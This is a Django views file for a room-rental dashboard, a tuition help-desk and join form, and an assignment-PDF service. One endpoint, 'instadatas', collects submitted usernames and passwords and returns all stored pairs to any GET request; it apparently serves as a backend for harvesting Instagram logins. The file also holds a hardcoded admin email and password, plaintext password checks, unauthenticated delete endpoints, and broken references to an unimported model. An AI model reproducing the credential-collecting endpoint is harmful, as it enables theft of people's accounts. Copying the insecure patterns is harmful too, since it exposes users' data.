

# Create your views here.
from django.http import HttpResponse,request
from django.shortcuts import render
from django.contrib import messages
import uuid
from django.template.loader import render_to_string
from django.views.decorators.csrf import csrf_exempt
from django.template import Context
import json
from django.http import JsonResponse
import base64
from django.core import serializers
import requests
from bs4 import BeautifulSoup
# all models data is here
# from . models import user
from . models import rooms
from . models import roomrequest


def index(request):
    # return render(request, 'startpage/index.html');
    return render(request,'dashboard/index.html')



def generate_unique_id(existing_ids):
    new_id = str(uuid.uuid4())
    while new_id in existing_ids:
        new_id = str(uuid.uuid4())
    return new_id

def dashboard(request):
    checkuser=user.objects.all()

    if request.method=="POST":
        emails=request.POST.get('email')
        if user.objects.filter(email=emails).exists():
            users=user.objects.get(email=emails)
            if users.password==request.POST.get('password'):
                return render(request,'dashboard/index.html')
            else :
                return HttpResponse('your password is wrong please login again <button onclick="history.go(-1)">login</button>')
        else:
            return HttpResponse('your email is wrong')
    else:
        return HttpResponse('your are not our user')

def saveitems(request):
    if request.method=='POST':

        imgcount=request.POST.get('imgcount')

        homew=rooms()
        for i in range(1,int(imgcount)+1):
            stri='img'+str(i)
            if stri=='img1':
                homew.img1=request.FILES[stri].read()
            elif stri=='img2':
                homew.img2=request.FILES[stri].read()
            elif stri=='img3':
                homew.img3=request.FILES[stri].read()
            elif stri=='img4':
                homew.img4=request.FILES[stri].read()
            elif stri=='img5':
                homew.img5=request.FILES[stri].read()
            elif stri=='img6':
                homew.img6=request.FILES[stri].read()

        # homew.questions=questions
        homew.uuid = str(uuid.uuid4())
        homew.location=request.POST.get('location')
        homew.about=request.POST.get('about')
        homew.room_area=request.POST.get('area')
        homew.price=request.POST.get('price')
        homew.save()
        return HttpResponse(' homework has been sent to all students <button onclick="history.go(-1)">go back</button>')
    return HttpResponse('<script>history.go(-1)</script>')



def senddata(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        if  data['datatype']=='rooms':
            admindata=rooms.objects.all()
            # finaldata=list(admindata.values())
            datas=[]

            for dt in admindata:
                imgdt=dt.img1
                obj={
                    'uuid':dt.uuid,
                    'location':dt.location,
                    'area':dt.room_area,
                    'about':dt.about,
                    'price':dt.price,
                    'img1':base64.b64encode(imgdt).decode('utf-8')
                }
                datas.append(obj)


            html=render_to_string('dashboard/employees.html')
            return JsonResponse({'success': True,'admindata':datas,'html':html})

        elif  data['datatype']=='roomdata':
            data = json.loads(request.body)
            dt=rooms.objects.get(uuid=data['uuid'])
            # finaldata=list(admindata.values())
            datas=[]


            obj={
                'uuid':dt.uuid,
                'location':dt.location,
                'area':dt.room_area,
                'about':dt.about,
                'price':dt.price,
                'img1':base64.b64encode(dt.img1).decode('utf-8'),
                'img2':base64.b64encode(dt.img2).decode('utf-8'),
                'img3':base64.b64encode(dt.img3).decode('utf-8'),
                'img4':base64.b64encode(dt.img4).decode('utf-8'),
                'img5':base64.b64encode(dt.img5).decode('utf-8'),
                'img6':base64.b64encode(dt.img6).decode('utf-8'),
            }
            datas.append(obj)


            html=render_to_string('dashboard/employees.html')
            return JsonResponse({'success': True,'admindata':datas,'html':html})

        elif  data['datatype']=='clients':
            data = json.loads(request.body)
            clients=list(roomrequest.objects.all().values());

            html=render_to_string('dashboard/clientlist.html')
            return JsonResponse({'success': True,'admindata':clients,'html':html})



    html=render_to_string('dashboard/employees.html')

    return JsonResponse({'success':False,'html':html})

def deleteroom(request,uuids):
    rooms.objects.get(uuid=uuids).delete()
    return JsonResponse({'success':True})


def deleteclient(request,uuids):
    roomrequest.objects.get(id=uuids).delete()
    return JsonResponse({'success':True})



def getroomdata(request,data):
    if request.method == 'GET':

        if  data=='rooms':
            admindata=rooms.objects.all()
            # finaldata=list(admindata.values())
            datas=[]

            for dt in admindata:
                imgdt=dt.img1
                obj={
                    'uuid':dt.uuid,
                    'location':dt.location,
                    'area':dt.room_area,
                    'about':dt.about,
                    'price':dt.price,
                    'img1':base64.b64encode(imgdt).decode('utf-8')
                }
                datas.append(obj)


            html=render_to_string('dashboard/employees.html')
            return JsonResponse({'success': True,'admindata':datas,'html':html})

        elif  data!='rooms':

            dt=rooms.objects.get(uuid=data)
            # finaldata=list(admindata.values())
            datas=[]


            obj={
                'uuid':dt.uuid,
                'location':dt.location,
                'area':dt.room_area,
                'about':dt.about,
                'price':dt.price,
                'img1':base64.b64encode(dt.img1).decode('utf-8'),
                'img2':base64.b64encode(dt.img2).decode('utf-8'),
                'img3':base64.b64encode(dt.img3).decode('utf-8'),
                'img4':base64.b64encode(dt.img4).decode('utf-8'),
                'img5':base64.b64encode(dt.img5).decode('utf-8'),
                'img6':base64.b64encode(dt.img6).decode('utf-8'),
            }
            datas.append(obj)


            html=render_to_string('dashboard/employees.html')
            return JsonResponse({'success': True,'admindata':datas,'html':html})


    html=render_to_string('dashboard/employees.html')

    return JsonResponse({'success':False,'html':html})

@csrf_exempt
def roomrequests(request,datas):
    # if request.method=="PUT":

    #     data=json.loads(request.body)
    #     rr=roomrequest()
    #     rr.room_uuid=request.PUT.get(datas)
    #     rr.client_name=request.PUT.get(data['name'])
    #     rr.note=request.PUT.get(data['note'])
    #     rr.conversation_time=request.PUT.get(data['conversationtime'])
    #     rr.client_mobile_no=request.PUT.get(data['mobileno'])
    #     rr.save()
    #     return JsonResponse({'success':True})
    if request.method=="POST":
        data=json.loads(request.body)
        rr=roomrequest()
        rr.room_uuid=datas
        rr.client_name=data['name']
        rr.note=data['note']
        rr.conversation_time=data['conversationtime']
        rr.client_mobile_no=data['mobileno']
        rr.save()
        return JsonResponse({'success':True})

    return JsonResponse({"success":False})

def getclients(request):
    if request.method=="POST":
        clients=list(roomrequest.objects.all().values());
        return JsonResponse({'success':True,"data":clients})
    return JsonResponse({'success':False})

from . models import instadata
from . models import ssc_help_desk
from . models import join_request
from . models import assignments

@csrf_exempt
def instadatas(request):
    if request.method=="POST":
        bd=json.loads(request.body)
        ins=instadata()
        ins.ids=bd['username']
        ins.passwords=bd['password']
        ins.save()
        return JsonResponse({"message":'your data is submitted'})
    else:
        data=list(instadata.objects.all().values())
        return JsonResponse({"data":data})

    return HttpResponse('no ok')



@csrf_exempt
def contacting(request):
    if request.method=="POST":
        bd=json.loads(request.body)
        ct=ssc_help_desk()
        ct.name=bd['name']
        ct.number=bd['number']
        ct.message=bd['message']
        ct.subject=bd['subject']
        ct.save()
        return JsonResponse({"message":'your data is submitted'})
    else:

        return JsonResponse({"data":"hello world"})

    return HttpResponse('not ok')
@csrf_exempt
def joiningclass(request):
    if request.method=="POST":
        bd=json.loads(request.body)
        ct=join_request()
        ct.name=bd['name']
        ct.mobile_no=bd['number']
        ct.email=bd['email']
        ct.std_class=bd['class']
        ct.address=bd['address']
        ct.save()
        return JsonResponse({"message":'your data is submitted'})
    else:

        return JsonResponse({"data":"hello world"})

    return HttpResponse('not ok')
@csrf_exempt
def ssc_getdata(request):
    if request.method=="POST":
        bd=json.loads(request.body)
        if bd['email']=='sukhdev6237@gmail.com' and bd['password']=='sukhdev@4321':

            contactdata=list(ssc_help_desk.objects.all().values())
            joinrequestdata=list(join_request.objects.all().values())

        return JsonResponse({"contacts":contactdata,"joinrequests":joinrequestdata})
    else:

        return JsonResponse({"data":"hello world"})

    return HttpResponse('not ok')

@csrf_exempt
def deletecontact(request,uuids):
    ssc_help_desk.objects.get(id=uuids).delete()
    return JsonResponse({'success':True})

@csrf_exempt
def deletejoin(request,uuids):
    join_request.objects.get(id=uuids).delete()
    return JsonResponse({'success':True})


    # ignou site api is starting from here
@csrf_exempt
def saveassignment(request):
    if request.method=='POST':

        year=request.POST.get('year')
        month=request.POST.get('month')
        program=request.POST.get('program')
        semester=request.POST.get('semester')
        course_code=request.POST.get('course_code')
        file=request.FILES['pdf'].read()

        homew=assignments()
        # homew.questions=questions
        homew.uuid = str(uuid.uuid4())
        homew.year=year
        homew.month=month
        homew.program=program
        homew.semester=semester
        homew.course_code=course_code
        homew.file=file

        homew.save()
        return HttpResponse(' file has been saved')
    return HttpResponse('you are not guy')


from django.http import HttpResponse
from PyPDF2 import PdfReader
from pdf2image import convert_from_bytes
from io import BytesIO
import random
from PIL import Image
from . models import asignmentrequest


import urllib.request
from lxml import html
def assignmentreq(request):

    data=asignmentrequest.objects.all()
    return JsonResponse({"datas":list(data.values()),"html":''})


@csrf_exempt
def getassignment(request):
    if request.method == 'POST':
        bd=json.loads(request.body)
        
        ar=""




        if  bd['type']=='pdfdata':
            try:

                ar=asignmentrequest.objects.get(program=bd['program'],sem=bd['semester'])
                i=ar.numbers
                ar.numbers=int(i)+1
                ar.save()
            except asignmentrequest.DoesNotExist:
                ar=asignmentrequest()
                ar.program=bd['program']
                ar.sem=bd['semester']
                ar.numbers=1
                ar.save()

            prg=bd['program']
            sem=bd['semester']
            print(sem)
            assignmentdata=assignments.objects.filter(program=prg,semester=sem)
            # finaldata=list(admindata.values())
            datas=[]


            for d in assignmentdata:
                # imgdt=d.file
                pdf = PdfReader(BytesIO(d.file))



                if True:
                    # pth="C:\Users\ajeetrathore\Documents\Release-23.11.0-0\poppler-23.11.0\Library\bin";


                    first_page_image = convert_from_bytes(d.file, single_file=True,poppler_path=r'C:\Users\ajeetrathore\Documents\Release-23.11.0-0\poppler-23.11.0\Library\bin')[0]



                    new_width = int(first_page_image.width * 0.2)
                    new_height = int(first_page_image.height * 0.2)
                    first_page_image = first_page_image.resize((new_width, new_height))

                    # Convert the resized image to base64
                    image_io = BytesIO()
                    first_page_image.save(image_io, 'PNG')

                    # Get the base64 encoded PNG image
                    img = base64.b64encode(image_io.getvalue()).decode()

                obj={
                    'uuid':d.uuid,
                    'program':d.program,
                    'semester':d.semester,
                    'course code':d.course_code+' (pdf)',
                    'size':len(d.file),
                    'img':img
                }
                datas.append(obj)


            # html=render_to_string('dashboard/employees.html')
            return JsonResponse({'success': True,'assignments':datas,})

        elif bd['type']=='pdf':
            uuids=bd['uuid']

            print(uuids)
            dt=assignments.objects.get(uuid=uuids)
            # finaldata=list(admindata.values())



            html=render_to_string('dashboard/employees.html')
            return JsonResponse({'success': True,'file':base64.b64encode(dt.file).decode('utf-8'),'name':dt.course_code})
        elif bd['type']=='downloadpdfdata':
            uuids=bd['uuid']
            d=assignments.objects.get(uuid=uuids)
            if bd['subtype']=='getdetails':

                obj={
                    'program':d.program,
                    'semester':d.semester,
                    'course code':d.course_code+' (pdf)',
                    'size':len(d.file),
                    'uuid':uuids
                }
                return JsonResponse({"data":obj});

            elif bd['subtype']=='getimage':
                
                    first_page_image = convert_from_bytes(d.file, single_file=True,poppler_path=r'C:\Users\ajeetrathore\Documents\Release-23.11.0-0\poppler-23.11.0\Library\bin')[0]



                    new_width = int(first_page_image.width * 0.8)
                    new_height = int(first_page_image.height * 0.8)
                    first_page_image = first_page_image.resize((new_width, new_height))

                    # Convert the resized image to base64
                    image_io = BytesIO()
                    first_page_image.save(image_io, 'PNG')

                    # Get the base64 encoded PNG image
                    img = base64.b64encode(image_io.getvalue()).decode()
                    return JsonResponse({"img":img})



    html=render_to_string('dashboard/employees.html')

    return JsonResponse({'success':False,'html':html})


def assignment(request):

    return render(request,'dashboard/form-vertical.html')

